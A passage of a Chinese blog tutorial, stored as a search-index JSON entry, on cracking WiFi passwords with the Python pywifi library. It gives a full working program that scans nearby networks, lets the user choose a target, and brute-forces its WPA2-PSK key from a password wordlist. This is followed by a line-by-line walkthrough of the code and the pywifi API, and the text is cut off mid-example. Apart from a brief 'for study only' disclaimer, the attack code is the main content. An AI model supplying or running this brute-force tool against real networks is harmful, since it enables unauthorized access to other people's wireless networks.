[{"title":"pywifi破解WiFi密码示例","url":"/2024/07/08/pywifi%E7%A0%B4%E8%A7%A3WiFi%E5%AF%86%E7%A0%81%E7%A4%BA%E4%BE%8B/","content":"python pywifi库破解WiFi密码（基于字典）前言本文章代码仅供参考，个人学习使用，请勿用于非法用途。\npython代码__author__ = &#x27;ximenxiaoxue&#x27;import sys #进行错误检查import random #快速排序使用import timeimport pywifi from pywifi import const,Profile# 功能：#1.判断自身是否连接到wifi#2.选择是否进行wifi密码破解，新建一个函数进行选择#3.进行破解class wifi_attack_main():    def __init__(self):  #这个是整个程序的入口，看这个函数的步骤就可以分析整个程序的流程了        self.wifi = pywifi.PyWiFi() #创建wifi对象        self.iface = self.wifi.interfaces()[0] #获取第一个无线网卡        self.wifi_status = self.iface.status()#获取无线网卡状态        self.choice = self.Choice() #选择是否进行wifi密码破解        self.wifi_attack(self.choice) #进行wifi攻击    def wifi_attack(self,choice):        if choice == True:            item_dict = self.wifi_scan() #扫描wifi            count,singnal_list = self.read_wifi_data(item_dict)#读取wifi数据            wifi_name_attack = self.wifi_attack_choose(count,singnal_list) #选择需要破解的wifi            self.wifi_crack(wifi_name_attack) #破解wifi密码        else:            print(&quot;已退出&quot;)            num = input(&quot;按任意键退出&quot;)        pass    def wifi_scan(self):        #扫描wifi        print(&quot;正在扫描wifi...&quot;+ &quot;\\n&quot;)        time.sleep(2) #不休眠扫描不全        try:            self.iface.scan()  # 扫描附近的wifi            while not self.iface.scan_results():                print(&quot;正在扫描...&quot;)        except:               sys.exit(&quot;扫描失败，请检查网络连接&quot;)        print(&quot;扫描完成&quot;)        num = 0        wifi_list_parameter = &#123;&#x27;SSID&#x27;: [], &#x27;Singnal level&#x27;: [], &#x27;BSSID&#x27;: [], &#x27;Frequency&#x27;: []&#125;        for bss in self.iface.scan_results():            num += 1            # print(&quot;SSID: %s&quot; % bss.ssid)  # wifi名称            # print(&quot;Singnal level: %s&quot; % bss.signal)  # 信号强度,信号强度是负数，越接近0网络强度越好            # print(&quot;BSSID: %s&quot; % bss.bssid)  # MAC地址            # # print(&quot;Encryption: %s&quot; % bss.encryption)            # print(&quot;Frequency: %s&quot; % bss.freq)  # 频率 2472000为2.4G网络，5745000为5G网络            # print(&quot;=&quot; * 20)            #            wifi_list_parameter[&#x27;SSID&#x27;].append(bss.ssid)            wifi_list_parameter[&#x27;Singnal level&#x27;].append(bss.signal)            wifi_list_parameter[&#x27;BSSID&#x27;].append(bss.bssid)            wifi_list_parameter[&#x27;Frequency&#x27;].append(bss.freq)        print(&quot;\\n&quot;+&quot;*&quot; * 20)        print(&quot;共扫描到%d个wifi&quot; % (num-1)) #不知道为啥pywifi会多扫描一个，所以-1        print(&quot;*&quot; * 20 + &quot;\\n&quot;)        #print(wifi_list_parameter)        return wifi_list_parameter    def Choice(self):#选择是否进行wifi密码破解        print(&quot;请保证网络开关已打开&quot;+ &quot;\\n&quot;)        #time.sleep(3)        if self.wifi_status == const.IFACE_DISCONNECTED:  # 判断无线网卡是否连接            print(&quot;网络未连接&quot;)        else:            print(&quot;网络已连接&quot;)        while True:#循环选择是否进行wifi密码破解            choose_2 = input(&quot;是否进行wifi密码破解程序？(y/n):&quot;)            if choose_2 == &quot;y&quot; or choose_2 == &quot;yes&quot;:                print(&quot;执行破解程序......&quot;)                choice = True                return choice            elif choose_2 == &quot;n&quot; or choose_2 == &quot;no&quot;:                print(&quot;正在退出程序&quot;)                choice = False                return choice            else:                print(&quot;输入错误，请重新输入&quot;)                continue    def read_wifi_data(self,item_dict):#读取wifi数据，传入的item_dict为字典类型，包含wifi信息        #&#123;&#x27;SSID&#x27;: &#123;&#x27;MERCURY_9CEE&#x27;, &#x27;szpjwfhm_5G&#x27;, &#x27;szpjwfhm&#x27;, &#x27;CMCC-5Z94&#x27;&#125;, &#x27;Singnal level&#x27;: &#123;-71, -70, -59, -83&#125;, &#x27;BSSID&#x27;: &#123;&#x27;cc:2d:21:e5:cc:b1:&#x27;, &#x27;cc:2d:21:e5:cc:b5:&#x27;, &#x27;6c:59:40:7e:9c:ee:&#x27;, &#x27;ec:6c:b5:ea:3f:28:&#x27;&#125;, &#x27;Frequency&#x27;: &#123;2417000, 2472000, 5745000, 2447000&#125;&#125;        print(&quot;\\n&quot; + &quot;正在处理数据...&quot;)        #将信号强度列表进行排序        wifi_list = self.indexed_quicksort(item_dict[&#x27;Singnal level&#x27;])        print(&quot;排序完成&quot; + &quot;\\n&quot;)        print(&quot;=&quot; * 20)        #读取wifi数据        print(&quot;正在读取wifi数据...&quot;)        print(&quot;=&quot; * 20 + &quot;\\n&quot;)        num = 0        wifi_signal_list = []        for i in range(len(wifi_list)):            num += 1            print(&quot;正在读取第%d个wifi数据...&quot; % (num))            print(&quot;WiFi编号：%d&quot; % (num))            print(&quot;名称：%s&quot; % item_dict[&#x27;SSID&#x27;][wifi_list[i]])            print(&quot;MAC地址：%s&quot; % item_dict[&#x27;BSSID&#x27;][wifi_list[i]])            print(&quot;频率：%s&quot; % item_dict[&#x27;Frequency&#x27;][wifi_list[i]])            print(&quot;信号强度：%s&quot; % item_dict[&#x27;Singnal level&#x27;][wifi_list[i]])            print(&quot;=&quot; * 20)            wifi_signal_list.append(item_dict[&#x27;SSID&#x27;][wifi_list[i]])        print(&quot;\\n&quot;+&quot;读取完成&quot;)        #print(wifi_signal_list)        print(&quot;\\n&quot;+&quot;*&quot; * 20)        return i,wifi_signal_list    def wifi_attack_choose(self,count,singnal_list):#选择需要破解的wifi        while True:            # 选择需要破解的wifi            choose_wifi = int(input(&quot;请输入需要破解的wifi的编号：&quot;)) - 1            if choose_wifi &lt; 0 or choose_wifi &gt; count:                print(&quot;输入错误，请重新输入&quot;)                continue            else:                break        wifi_name_attack = singnal_list[choose_wifi]        print(&quot;正在破解wifi：%s&quot; % wifi_name_attack)        return wifi_name_attack    def wifi_crack(self,wifi_name_attack):#破解wifi密码        print(&quot;正在破解wifi密码...&quot;)        # 读取字典文件        # 字典文件格式：text        path = &quot;wifi_password.txt&quot;        with open(path, &quot;r&quot;) as f:            data = f.read()            data = data.split(&quot;\\n&quot;)            for try_password in data:                #print(line)                profile = Profile()                profile.ssid = wifi_name_attack  # wifi名称                # 网卡开放状态                # &quot;Auth - AP&quot; 验证算法                profile.auth = const.AUTH_ALG_OPEN                # WiFi的加密算法为&quot;WPA&quot;                # 选择WiFi加密算法                # &quot;Akm - AP&quot; 的密钥管理                profile.akm.append(const.AKM_TYPE_WPA2PSK)                # 加密单元                # &quot;Cipher - AP&quot; 密码类型                profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元                # 设置密码                profile.key = try_password  # wifi密码                self.iface.remove_all_network_profiles()  # 删除所有wifi配置文件                self.iface.add_network_profile(profile)  # 添加wifi配置文件                self.iface.connect(profile)  # 连接wifi                time.sleep(1) #等待连接,这个可以防止连接过快导致无法连接                if self.iface.status() == const.IFACE_CONNECTED:                    print(&quot;密码: %s 校验成功&quot; % try_password)                    return None                else:                    print(&quot;密码: %s 校验失败&quot; % try_password)                    pass    def indexed_quicksort(self, array):        # 创建一个包含 (值, 原始索引) 的列表        arr_with_index = [(value, index) for index, value in enumerate(array)]        # 快速排序函数，对 arr_with_index 进行排序        def quicksort(arr):            if len(arr) &lt;= 1:                return arr            else:                # 随机选择基准元素                pivot_index = random.randint(0, len(arr) - 1)                pivot = arr[pivot_index][0]                left = []  # 小于基准的元素                right = []  # 大于基准的元素                middle = []  # 等于基准的元素                for value, original_index in arr:                    if value &lt; pivot:                        left.append((value, original_index))                    elif value &gt; pivot:                        right.append((value, original_index))                    else:                        middle.append((value, original_index))                return quicksort(right) + middle + quicksort(left)  # 将较大的元素放在前面        # 执行快速排序        sorted_arr_with_index = quicksort(arr_with_index)        # 提取排序后的值和原始索引        #sorted_values = [value for value, _ in sorted_arr_with_index]  # 获取排序后的值        sorted_original_indices = [index for _, index in sorted_arr_with_index]  # 获取排序后的值的原始索引，用来匹配WiFi的信息        #print(sorted_original_indices)        return sorted_original_indicesif __name__ == &#x27;__main__&#x27;:    wifi_attack = wifi_attack_main()\n\n正文准备工作首先，你需要安装pywifi库，同时下载pywifi的依赖库，命令如下：\npip install pywifi\n\npip install comtypes\n\n没有comtypes库pywifi库是不能运行的，这个要注意。\n\n代码解析:思路分析功能：\n\n判断自身是否连接到wifi\n\n选择是否进行wifi密码破解\n\n进行破解\n\n\n\n代码解析:pywifi库的基本使用\n先列出基本的用法代码\nimport pywififrom pywifi import const#  1. 基础#  获取网卡接口wifi = pywifi.PyWiFi()#  得到第一个无线网卡ifaces = wifi.interfaces()[0]#  切断网卡连接#ifaces.disconnect()#  获取wifi的连接状态wifistatus = ifaces.status()print(wifistatus)#  检查wifi是否处于切断状态if wifistatus == const.IFACE_DISCONNECTED:    #  网卡已被切断    pass#  如果网卡没有被切断#  或者使用 &quot; if wifistatus == const.IFACE_CONNECTED: &quot;else:    #  已连接wifi    pass#  如果已经切断网卡，一般执行下述操作if wifistatus == const.IFACE_DISCONNECTED:    #  设置wifi连接文件    profile = pywifi.Profile()    #  你要连接的网络的名称    profile.ssid = &quot;    &quot;    #  网卡的开放状态    #  &quot; Auth - AP &quot;的验证算法    profile.auth = const.AUTH_ALG_OPEN    #  wifi的加密算法    #  通常的加密算法值为 &quot; WPA &quot;    #  选择wifi的加密方式    #  &quot; Akm - AP &quot;的密钥管理    profile.akm.append(const.AKM_TYPE_WPA2PSK)    #  加密单元    #  &quot; Cipher - AP &quot;的密码类型    profile.cipher = const.CIPHER_TYPE_CCMP    #  设置密码    password = &quot;   &quot;    #  回调密码（wifi密码）    #  如果没有密码，则设置值为 &quot; CIPHER_TYPE_NONE &quot;    profile.key = password    #  删除已连接的所有wifi文件    ifaces.remove_all_network_profiles()    #  加载新的wifi连接文件    tep_profile = ifaces.add_network_profile(profile)    #  连接上面的wifi文件    ifaces.connect(tep_profile)    #  如果wifi已连接    if ifaces.status() == const.IFACE_CONNECTED:        print(True)    #  如果仍未连接    else:        print(False)\n\n\npywifi代码基础讲解import pywififrom pywifi import const, Profile\n\n首先，导入pywifi库和const和Profile模块。\nconst模块提供了一些常量，用于表示一些常用的状态和参数。\nProfile模块用于创建wifi配置文件。\nconst这个是必须要导入的，因为pywifi库的很多功能都是基于const这个模块的，没有这个const模块，pywifi库是不能运行的。\nProfile这个模块可以创建wifi配置文件，用于连接wifi,这个可有可无，可以根据自己的需求选择是否导入。\n\nwifi = pywifi.PyWiFi()\n\n创建wifi对象，这个对象是用来管理wifi的。\niface = wifi.interfaces()[0]\n\n获取第一个无线网卡，这个网卡是用来连接wifi的。\nwifi_status = iface.status()\n\niface.status()方法可以获取无线网卡的状态(获取数字：0-未连接，1-正在扫描，2-未激活，3-正在连接，4-已连接)，这个状态有四种状态:\n\nconst.IFACE_DISCONNECTED 未连接 \nconst.IFACE_SCANNING 正在扫描\nconst.IFACE_CONNECTING 正在连接\nconst.IFACE_CONNECTED 已连接\n\n在pywifi库中，这几个状态有不同的数字表示，大家可以按ctrl然后点击鼠标左键，可以查看到具体的数字表示，在这里我直接列出来了。\nIFACE_DISCONNECTED = 0 #未连接IFACE_SCANNING = 1 #正在扫描IFACE_INACTIVE = 2 #未激活IFACE_CONNECTING = 3 #正在连接IFACE_CONNECTED = 4 #已连接\n\n\n所以，我们可以先根据这行代码判断我们的联网状态，不过有一点是，如果没有打开网络开关怎么办？好问题，python里面好像没有能够打开网络开关的方法，这个问题我们留到后面讲，单纯写一个网络未打开的提示就好了。\n\n我们如果要破解WiFi密码，我们需要先扫描到目标WiFi，所以我们需要先获取到目标WiFi的相关信息，所以我们需要先扫描到目标WiFi。\niface.scan()  # 扫描附近的wifiiface.scan_results()  # 获取扫描结果\n\niface.scan()方法可以扫描附近的wifi，iface.scan_results()方法可以获取扫描结果。\niface.scan()是不返回任何的输出结果的，想要知道结果必须要用iface.scan_results()方法。\n当然，iface.scan_results()方法返回的是一个列表，要是单纯的打印的话，会发现这东西根本就看不懂。\n[&lt;pywifi.profile.Profile object at 0x000001DA521032C0&gt;, &lt;pywifi.profile.Profile object at 0x000001DA52103350&gt;, &lt;pywifi.profile.Profile object at 0x000001DA52103380&gt;, &lt;pywifi.profile.Profile object at 0x000001DA521033B0&gt;, &lt;pywifi.profile.Profile object at 0x000001DA521033E0&gt;]\n\n这我TM的怎么看？\n后面，我们会解决这个问题，先暂时不管这个问题。\n\n但是，我们需要注意的一点是，iface.scan_results()包含了很多wifi的相关信息,包括wifi的名称，信号强度，MAC地址，频率等等。\n\n\n剩下的代码就是我们的最为核心的部分，WiFi的连接.\nwifi的连接，我们需要先创建一个wifi配置文件。\n这个配置文件的属性有：WiFi名称，WiFi密码，加密算法，加密单元。\n所以一开始我们要创建一个WiFi配置文件。\nprofile = Profile() #需要 from pywifi import Profileprofile = pywifi.Profile() #不需要 from pywifi import Profile\n\n创建profile对象，这个对象是用来创建wifi配置文件的。\nprofile.ssid = &quot;WiFi名称&quot; #WiFi名称profile.key = &quot;WiFi密码&quot; #WiFi密码profile.auth = const.AUTH_ALG_OPEN #认证算法profile.akm.append(const.AKM_TYPE_WPA2PSK) #加密单元profile.cipher = const.CIPHER_TYPE_CCMP #加密单元\n\n\nprofile.ssid是wifi的名称\n\nprofile.key是wifi的密码\n\nprofile.auth是认证算法，这个是必须要设置的，常用的加密算法有：const.AUTH_ALG_OPEN（开放），const.AUTH_ALG_SHARED（共享）。\n\nprofile.akm.append(const.AKM_TYPE_WPA2PSK)是加密单元，这个是必须要设置的，常用的加密单元有：AKM_TYPE_NONE（无加密），AKM_TYPE_WPA（WPA），AKM_TYPE_WPAPSK（WPA-PSK），AKM_TYPE_WPA2（WPA2），AKM_TYPE_WPA2PSK（WPA2-PSK）。\n\nprofile.cipher是加密单元，这个是必须要设置的，常用的加密单元有：const.CIPHER_TYPE_NONE（无加密），const.CIPHER_TYPE_WEP（WEP），const.CIPHER_TYPE_TKIP（TKIP），const.CIPHER_TYPE_CCMP（CCMP）。\n\n\n\n\n这四个是必须要设置的,下面我们讲解他们的不同。\n\n\n\n对于profile.auth的认证算法，我们一般选择const.AUTH_ALG_OPEN，const.AUTH_ALG_SHARED，在pywifi 库中支持这两个,大家可以左键看一下\nAUTH_ALG_OPEN = 0 #开放认证系统(认证阶段不需要提供密码)AUTH_ALG_SHARED = 1 #共享密钥认证系统(认证阶段需要提供密码，但是密钥是共享的，安全性低)\n\n我们一般设置为const.AUTH_ALG_OPEN，尽管他是开放系统(即不需要在认证阶段提供密码)，但是我们使用的WPA/WPA2加密算法(AKM)，连接WiFi就需要密码验证。\n简单点说，就算是我们设置了开放系统认证const.AUTH_ALG_OPEN，但只要AKM的加密算法在，我们连接网络就需要密码\n讲这个是为了防止大家认为只要设置了const.AUTH_ALG_OPEN，就不需要密码，其实不然，我们设置了const.AUTH_ALG_OPEN，那么连接网络就需要密码。但是如果我们没有配置const.AUTH_ALG_OPEN，就可能会导致连接失败。\n\n\n对于profile.akm.append(const.AKM_TYPE_WPA2PSK)的加密单元，我们一般选择AKM_TYPE_WPA2PSK，在pywifi 库中支持的还有其他几个，大家可以左键看一下\nAKM_TYPE_NONE = 0 #没有安全设置，网络不使用加密，任何人都可以连接，通常不推荐使用，因为它不提供任何数据保护AKM_TYPE_WPA = 1 #WPA（WiFi Protected Access）认证，使用TKIP（Temporal Key Integrity Protocol）作为加密算法，是一种较老的加密标准AKM_TYPE_WPAPSK = 2 #WPA-PSK（Pre-Shared Key）认证，是WPA的个人版，使用TKIP加密算法，需要用户输入预共享密钥（即WiFi密码）AKM_TYPE_WPA2 = 3 #WPA2认证，使用CCMP（Counter Mode with Cipher Block Chaining Message Authentication Code Protocol）作为加密算法，是一种更安全的加密标准AKM_TYPE_WPA2PSK = 4 #WPA2-PSK认证，是WPA2的个人版，使用CCMP加密算法，需要用户输入预共享密钥AKM_TYPE_UNKNOWN = 5 #未知的AKM类型，通常用于在未能识别网络的AKM类型时提供一个通用的值\n\n我们一般选择AKM_TYPE_WPA2PSK，因为这个算法是当前最广泛的加密算法，也就是平常咱们用的WiFi的加密方式。\n\n\n对于profile.cipher的加密单元，我们一般选择const.CIPHER_TYPE_CCMP，在pywifi 库中支持的还有其他几个，大家可以左键看一下.\nCIPHER_TYPE_NONE = 0 #没有加密，数据传输不使用加密算法。这通常与 AKM_TYPE_NONE 一起使用，适用于没有安全设置的开放网络CIPHER_TYPE_WEP = 1 #使用WEP（Wired Equivalent Privacy）加密算法，这是一种较老的加密标准，现在已经不推荐使用，因为它容易受到安全攻击CIPHER_TYPE_TKIP = 2 #使用TKIP（Temporal Key Integrity Protocol）加密算法，这是WPA（WiFi Protected Access）标准使用的加密方式CIPHER_TYPE_CCMP = 3 #使用CCMP（Counter Mode with Cipher Block Chaining Message Authentication Code Protocol）加密算法，这是WPA2（WiFi Protected Access 2）标准使用的加密方式，比TKIP更安全CIPHER_TYPE_UNKNOWN = 4 #未知的加密单元，通常用于在未能识别网络的加密单元时提供一个通用的值,通常不使用\n\n这里我们选择const.CIPHER_TYPE_CCMP，因为我们前面选择的是AKM_TYPE_WPA2PSK加密方式，这个加密方式使用的是CCMP加密单元，而对应的这里选择的加密单元也必须是CCMP,要对应一致，否则连接不上WiFi，而pywifi提供的加密单元中只有CIPHER_TYPE_CCMP提供CCMP加密单元。\n\n接下来，我们开始连接WiFi.\nifaces.remove_all_network_profiles() #删除所有wifi配置文件tep_profile = ifaces.add_network_profile(profile) #加载新的wifi连接文件ifaces.connect(tep_profile) #连接上面的wifi文件if ifaces.status() == const.IFACE_CONNECTED: #如果wifi已连接    print(True)#  如果仍未连接else:    print(False)\n\n\nifaces.remove_all_network_profiles()是删除所有wifi配置文件，这个是必须要做的，因为我们每次连接wifi，都需要创建一个新的配置文件，如果不删除，就会出现多个配置文件，导致连接失败。\n\ntep_profile = ifaces.add_network_profile(profile)是加载新的wifi连接文件，这个是必须要做的，因为我们每次连接wifi，都需要创建一个新的配置文件，如果不加载，就会出现连接失败。\n\nifaces.connect(tep_profile)是连接上面的wifi文件。\n\n\n最后通过if判断进行判断是否连接成功，如果连接成功，打印True，如果连接失败，打印False。\n\n到现在，我们基础的pywifi的基础用法就讲完了，这样大家基本上也就能自己做出一个基于字典的WiFi密码破解器了，大家可以先自行尝试一下，接下来，我就来讲解我的WiFi密码破解器。\n\n代码解析:代码整体思路我打算以后再做一个GUI的界面，然后就使用了类的方法进行实现WiFi密码破解器的功能。\n\n判断自身网络连接情况\n扫描附近WiFi\n选择要破解的WiFi\n破解WiFi\n\n我们的思路很简单照着这个开始写代码就可以了。\n代码实现:pywifi基本需要__author__ = &#x27;ximenxiaoxue&#x27;import sys #进行错误检查import random #快速排序使用import timeimport pywifi from pywifi import const,Profile# 功能：#1.判断自身是否连接到wifi#2.选择是否进行wifi密码破解，新建一个函数进行选择#3.进行破解class wifi_attack_main():    def __init__(self):  #这个是整个程序的入口，看这个函数的步骤就可以分析整个程序的流程了        self.wifi = pywifi.PyWiFi() #创建wifi对象        self.iface = self.wifi.interfaces()[0] #获取第一个无线网卡        self.wifi_status = self.iface.status()#获取无线网卡状态\n\n首先，我们的思路都在 __init__ 函数里面，在这里实现我们要操作的内容。这里面的代码也很简单都是我们先前讲的pywifi的基础用法。\n代码实现:判断自身网络连接情况def __init__(self):  #这个是整个程序的入口，看这个函数的步骤就可以分析整个程序的流程了    self.wifi = pywifi.PyWiFi() #创建wifi对象    self.iface = self.wifi.interfaces()[0] #获取第一个无线网卡    self.wifi_status = self.iface.status()#获取无线网卡状态    self.choice = self.Choice() #选择是否进行wifi密码破解    self.wifi_attack(self.choice) #进行wifi攻击\n\n我们再写一个函数来根据WiFi的连接情况进行连接网络的判断，也就是Choice函数。\ndef Choice(self):#选择是否进行wifi密码破解    print(&quot;请保证网络开关已打开&quot;+ &quot;\\n&quot;)    #time.sleep(3)    if self.wifi_status == const.IFACE_DISCONNECTED:  # 判断无线网卡是否连接        print(&quot;网络未连接&quot;)    else:        print(&quot;网络已连接&quot;)    while True:#循环选择是否进行wifi密码破解        choose_2 = input(&quot;是否进行wifi密码破解程序？(y/n):&quot;)        if choose_2 == &quot;y&quot; or choose_2 == &quot;yes&quot;:            print(&quot;执行破解程序......&quot;)            choice = True            return choice        elif choose_2 == &quot;n&quot; or choose_2 == &quot;no&quot;:            print(&quot;正在退出程序&quot;)            choice = False            return choice        else:            print(&quot;输入错误，请重新输入&quot;)            continue\n\n这个函数的功能是判断是否进行wifi密码破解，代码也并不难，就是使用pywifi库的status()方法来判断无线网卡的状态，然后根据状态进行选择是否进行wifi密码破解。\n为了避免输入错误的情况，我们选择使用while循环来进行选择，直到输入正确为止。\n再根据选择弹出choice变量，如果选择进行破解，则choice为True，否则为False。\n我们后面要根据这个choice变量来选择是否进行破解程序的执行。\n代码实现:破解操作我们也会先写一个专门用于破解的函数，也就是wifi_attack函数。\n我们也要先明白，这个函数具体要干什么，这个函数是个框架，具体的实现要到其他函数里面去。\n\n\n首先，我们根据choice变量来判断是否进行破解程序的执行。\n如果choice为True，我们就开始进行破解程序的执行。\n首先，我们先扫描附近的WiFi，获取到目标WiFi的相关信息。\n然后，处理我们获取到的目标WiFi的相关信息。\n然后，选择需要破解的WiFi。\n最后，创建WiFi配置文件，连接目标WiFi，破解密码。\n\n\n如果choice为False，我们就退出程序。\n\n\n\n\n这就是我们的wifi_attack函数的整个框架，我们按照这个思路来实现整个函数。\ndef wifi_attack(self,choice):    if choice == True:        item_dict = self.wifi_scan() #扫描wifi        count,singnal_list = self.read_wifi_data(item_dict)#读取wifi数据        wifi_name_attack = self.wifi_attack_choose(count,singnal_list) #选择需要破解的wifi        self.wifi_crack(wifi_name_attack) #破解wifi密码    else:        print(&quot;已退出&quot;)        num = input(&quot;按任意键退出&quot;)    pass\n\n\n所以我们一开始判断是否进行wifi密码破解，然后根据选择进行破解程序的执行。如果为True，我们就开始进行破解程序的执行。\n\n简单的退出程序写完了，我们再根据思路来写破解的程序。\n按照思路，第一步，我们先扫描附近的WiFi，获取到目标WiFi的相关信息。\n写一个函数wifi_scan()来实现这个功能。\ndef wifi_scan(self): #扫描wifi print(&quot;正在扫描wifi...&quot;+ &quot;\\n&quot;) time.sleep(2) #不休眠扫描不全 try:     self.iface.scan()  # 扫描附近的wifi     while not self.iface.scan_results():         print(&quot;正在扫描...&quot;) except:        sys.exit(&quot;扫描失败，请检查网络连接&quot;) print(&quot;扫描完成&quot;) num = 0 wifi_list_parameter = &#123;&#x27;SSID&#x27;: [], &#x27;Singnal level&#x27;: [], &#x27;BSSID&#x27;: [], &#x27;Frequency&#x27;: []&#125; for bss in self.iface.scan_results():     num += 1     # print(&quot;SSID: %s&quot; % bss.ssid)  # wifi名称     # print(&quot;Singnal level: %s&quot; % bss.signal)  # 信号强度,信号强度是负数，越接近0网络强度越好     # print(&quot;BSSID: %s&quot; % bss.bssid)  # MAC地址     # # print(&quot;Encryption: %s&quot; % bss.encryption)     # print(&quot;Frequency: %s&quot; % bss.freq)  # 频率 2472000为2.4G网络，5745000为5G网络     # print(&quot;=&quot; * 20)     #     wifi_list_parameter[&#x27;SSID&#x27;].append(bss.ssid)     wifi_list_parameter[&#x27;Singnal level&#x27;].append(bss.signal)     wifi_list_parameter[&#x27;BSSID&#x27;].append(bss.bssid)     wifi_list_parameter[&#x27;Frequency&#x27;].append(bss.freq) print(&quot;\\n&quot;+&quot;*&quot; * 20) print(&quot;共扫描到%d个wifi&quot; % (num-1)) #不知道为啥pywifi会多扫描一个，所以-1 print(&quot;*&quot; * 20 + &quot;\\n&quot;) #print(wifi_list_parameter) return wifi_list_parameter\n\n咱们正常的先扫描一下wifi，也就是使用iface.scan()方法，然后使用iface.scan_results()方法来获取扫描到的wifi信息。\n不过大家都知道这iface.scan_results()方法正常打印根本就看不懂，所以我们需要处理这个方法。\n正常打印的结果如下：\n[&lt;pywifi.profile.Profile object at 0x000001DA521032C0&gt;, &lt;pywifi.profile.Profile object at 0x000001DA52103350&gt;, &lt;pywifi.profile.Profile object at 0x000001DA52103380&gt;, &lt;pywifi.profile.Profile object at 0x000001DA521033B0&gt;, &lt;pywifi.profile.Profile object at 0x000001DA521033E0&gt;]\n\n但是我们要知道的是，这个列表返回的每个实例的内存地址，这也就表明他们都是独立的实例，所以我们不能直接打印这个列表，我们可以通过遍历的方法，查看每个对象的详细信息。\nfor bss in self.iface.scan_results():    num += 1    print(&quot;SSID: %s&quot; % bss.ssid)  # wifi名称    print(&quot;Singnal level: %s&quot; % bss.signal)  # 信号强度,信号强度是负数，越接近0网络强度越好    print(&quot;BSSID: %s&quot; % bss.bssid)  # MAC地址        print(&quot;Frequency: %s&quot; % bss.freq)  # 频率 2472000为2.4G网络，5745000为5G网络    print(&quot;=&quot; * 20)\n\n通过这样遍历，我们可以打印出我们需要的wifi信息。\nSSID: szpjwfhmSingnal level: -58BSSID: cc:2d:21:e5:cc:b1:Frequency: 2417000====================SSID: MERCURY_9CEESingnal level: -81BSSID: 6c:59:40:7e:9c:ee:Frequency: 2472000====================SSID: szpjwfhm_5GSingnal level: -74BSSID: cc:2d:21:e5:cc:b5:Frequency: 5745000====================SSID: CMCC-5Z94Singnal level: -65BSSID: ec:6c:b5:ea:3f:28:Frequency: 2442000====================SSID: szpjwfhmSingnal level: -58BSSID: cc:2d:21:e5:cc:b1:Frequency: 2417000====================\n\n除了这些，然后按住Ctrl键，然后鼠标左键点击scan_results()对象，就可以看到这个对象的详细信息,我们还会发现下面这些信息：\ndef scan_results(self):    &quot;&quot;&quot;Return the scan result.&quot;&quot;&quot;        bsses = self._wifi_ctrl.scan_results(self._raw_obj)    if self._logger.isEnabledFor(logging.INFO):        for bss in bsses:            self._logger.info(&quot;Find bss:&quot;)            self._logger.info(&quot;\\tbssid: %s&quot;, bss.bssid)            self._logger.info(&quot;\\tssid: %s&quot;, bss.ssid)            self._logger.info(&quot;\\tfreq: %d&quot;, bss.freq)            self._logger.info(&quot;\\tauth: %s&quot;, bss.auth)            self._logger.info(&quot;\\takm: %s&quot;, bss.akm)            self._logger.info(&quot;\\tsignal: %d&quot;, bss.signal)    return bsses\n\n除了我们打印的那些，我们还能知道WiFi的认证方式(bss.auth)，加密方式(bss.akm)，咱们这里就不打印了，如果大家需要可以自行改造。\n这样我们就获取了附近WiFi的信息，但是，我们想一想，这些数据是需要我们存储起来要用的，我们就得想个法子把我们获取到的WiFi的信息保存起来。\n我的方法是使用一个字典，把获取到的信息都存到字典里面，但是我们存放就会有一个问题，他们都是同一个键值，我们要怎么存放起来？\n所以，我选择使用在每个键值上关联一个列表，这样就能把相同键值的数据存放到一块去了。\nwifi_list_parameter = &#123;&#x27;SSID&#x27;: [], &#x27;Singnal level&#x27;: [], &#x27;BSSID&#x27;: [], &#x27;Frequency&#x27;: []&#125;\n\n\n这样，我们想要去取出数据也是很简单的，毕竟是列表嘛，我们直接索引就可以了。\n\nwifi_list_parameter[&#x27;键值&#x27;].append(bss.数据)\n\n这样我们就把获取到的WiFi信息都存到字典里面了,最后，我们简单写个统计函数，统计一下有多少个wifi，但是我发现，他总是会莫名其妙的多扫描一个，而且经常把强度最强那个WiFi多扫描一遍，所以，我就使用了num-1来统计。大家可以去尝试一下这个问题。\n\n前面，我们也提到了，如果网络开关没有打开怎么办？，我们就在这里加个判断，如果网络开关没有打开，就退出程序，提示用户打开网络开关，我们使用try...excepy语法配合sys.exit()方法来实现这个功能，如果网络开关关闭就退出程序。\n\n最后,我们弹出我们存储的WiFi信息 (因为我们后面还要处理WiFi信息，把WiFi强度大的放在前面),即wifi_list_parameter，我们这个函数的成品就是这样：\ndef wifi_scan(self):    #扫描wifi    print(&quot;正在扫描wifi...&quot;+ &quot;\\n&quot;)    time.sleep(2) #不休眠扫描不全    try:        self.iface.scan()  # 扫描附近的wifi        while not self.iface.scan_results():            print(&quot;正在扫描...&quot;)    except:           sys.exit(&quot;扫描失败，请检查网络连接&quot;)    print(&quot;扫描完成&quot;)    num = 0    wifi_list_parameter = &#123;&#x27;SSID&#x27;: [], &#x27;Singnal level&#x27;: [], &#x27;BSSID&#x27;: [], &#x27;Frequency&#x27;: []&#125;    for bss in self.iface.scan_results():        num += 1        wifi_list_parameter[&#x27;SSID&#x27;].append(bss.ssid)        wifi_list_parameter[&#x27;Singnal level&#x27;].append(bss.signal)        wifi_list_parameter[&#x27;BSSID&#x27;].append(bss.bssid)        wifi_list_parameter[&#x27;Frequency&#x27;].append(bss.freq)    print(&quot;\\n&quot;+&quot;*&quot; * 20)    print(&quot;共扫描到%d个wifi&quot; % (num-1)) #不知道为啥pywifi会多扫描一个，所以-1    print(&quot;*&quot; * 20 + &quot;\\n&quot;)    #print(wifi_list_parameter)    return wifi_list_parameter\n\n\n接下来就是我们要处理我们获取的WiFi信息了，我们要根据WiFi的信号强度进行排序。\n这是wifi_list_parameter字典中的数据：\n&#123;&#x27;SSID&#x27;: [&#x27;szpjwfhm&#x27;, &#x27;MERCURY_9CEE&#x27;, &#x27;szpjwfhm_5G&#x27;, &#x27;CMCC-5Z94&#x27;, &#x27;szpjwfhm&#x27;], &#x27;Singnal level&#x27;: [-58, -81, -74, -65, -58], &#x27;BSSID&#x27;: [&#x27;cc:2d:21:e5:cc:b1:&#x27;, &#x27;6c:59:40:7e:9c:ee:&#x27;, &#x27;cc:2d:21:e5:cc:b5:&#x27;, &#x27;ec:6c:b5:ea:3f:28:&#x27;, &#x27;cc:2d:21:e5:cc:b1:&#x27;], &#x27;Frequency&#x27;: [2417000, 2472000, 5745000, 2442000, 